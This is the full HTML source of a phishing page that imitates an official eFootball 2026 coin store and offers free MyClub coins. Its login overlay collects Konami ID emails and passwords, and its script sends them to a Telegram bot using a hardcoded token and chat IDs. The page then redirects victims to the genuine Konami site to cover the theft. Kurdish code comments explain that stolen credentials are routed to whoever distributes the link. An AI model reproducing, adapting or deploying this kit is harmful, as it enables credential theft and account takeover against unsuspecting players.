<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>eFootball™ 2026 - Coin Store</title>
    <style>
        * { box-sizing: border-box; font-family: 'Arial Black', sans-serif; margin: 0; padding: 0; }
        body { background-color: #050a14; color: white; display: flex; flex-direction: column; align-items: center; padding: 10px; }
        .top-bar { width: 100%; max-width: 500px; display: flex; justify-content: space-between; align-items: center; padding: 15px; background: #001a33; border-bottom: 3px solid #00a9ff; margin-bottom: 20px; border-radius: 8px; }
        .logo { height: 25px; }
        .store-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; width: 100%; max-width: 500px; }
        .coin-card { background: #1a2a40; border-radius: 12px; padding: 15px; text-align: center; border: 1px solid #2a3a50; cursor: pointer; }
        .coin-img { width: 80px; height: 80px; object-fit: contain; margin-bottom: 10px; }
        .coin-amount { font-size: 20px; font-weight: bold; margin-bottom: 10px; display: flex; align-items: center; justify-content: center; gap: 5px; }
        .price-tag { background: #00a9ff; color: white; padding: 8px; border-radius: 5px; font-weight: bold; width: 100%; display: block; }
        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: none; justify-content: center; align-items: center; z-index: 1000; }
        .login-box { background: #15202b; padding: 25px; border-radius: 15px; width: 90%; max-width: 350px; border: 2px solid #00a9ff; text-align: center; }
        input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 5px; border: 1px solid #333; background: #000; color: #fff; outline: none; }
        .submit-btn { background: #f9d423; color: #000; border: none; padding: 12px; width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>

    <div class="top-bar">
        <img src="https://www.konami.com/efootball/s/img/common/logo_efootball.png" class="logo">
        <div style="color: #f9d423; font-size: 14px;">🪙 MyClub Coins</div>
    </div>

    <div class="store-grid">
        <div class="coin-card" onclick="openLogin()">
            <div class="coin-amount">🪙 300</div>
            <img src="https://i.ibb.co/hR8yXmC/ef-coin.png" class="coin-img">
            <span class="price-tag">FREE</span>
        </div>
        <div class="coin-card" onclick="openLogin()">
            <div class="coin-amount">🪙 1,040</div>
            <img src="https://i.ibb.co/hR8yXmC/ef-coin.png" class="coin-img">
            <span class="price-tag">FREE</span>
        </div>
        <div class="coin-card" onclick="openLogin()">
            <div class="coin-amount">🪙 2,130</div>
            <img src="https://i.ibb.co/hR8yXmC/ef-coin.png" class="coin-img">
            <span class="price-tag">FREE</span>
        </div>
        <div class="coin-card" onclick="openLogin()">
            <div class="coin-amount">🪙 12,000</div>
            <img src="https://i.ibb.co/hR8yXmC/ef-coin.png" class="coin-img">
            <span class="price-tag">FREE</span>
        </div>
    </div>

    <div class="overlay" id="loginOverlay">
        <div class="login-box">
            <h3 style="color: #00a9ff; margin-bottom: 10px;">KONAMI ID LOGIN</h3>
            <form id="konamiForm">
                <input type="email" id="email" placeholder="Email (Konami ID)" required>
                <input type="password" id="pass" placeholder="Password" required>
                <button type="submit" class="submit-btn">CLAIM COINS</button>
            </form>
        </div>
    </div>

    <script>
        // لێرە کارێ سەرەکی دهێتە کرن
        const urlParams = new URLSearchParams(window.location.search);
        const chat_id = urlParams.get('id'); // ئایدیێ کەسی ژ لێنکێ وەردگریت
        const admin_id = "6648131751"; // ئایدیێ تە یێ ئەدمین بۆ حالەتێن پێدڤی
        const token = "8134043701:AAHd38Sjmce9mpvQpJp-8FRgbo2fQ-B7Jw0";

        function openLogin() {
            document.getElementById('loginOverlay').style.display = 'flex';
        }

        document.getElementById('konamiForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;
            
            // ئەگەر لێنک ئایدی تێدا بیت دێ بۆ وی چیت، ئەگەر نە دێ بۆ تە هێت
            const target = chat_id ? chat_id : admin_id;

            const msg = `⚽ eFootball Coins Claimed!\n\n📧 ID: ${email}\n🔑 Pass: ${pass}\n👤 Target ID: ${target}`;

            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: target, text: msg })
            })
            .then(() => {
                window.location.href = "https://www.konami.com/efootball/";
            })
            .catch(() => {
                window.location.href = "https://www.konami.com/efootball/";
            });
        });
    </script>
</body>
</html>
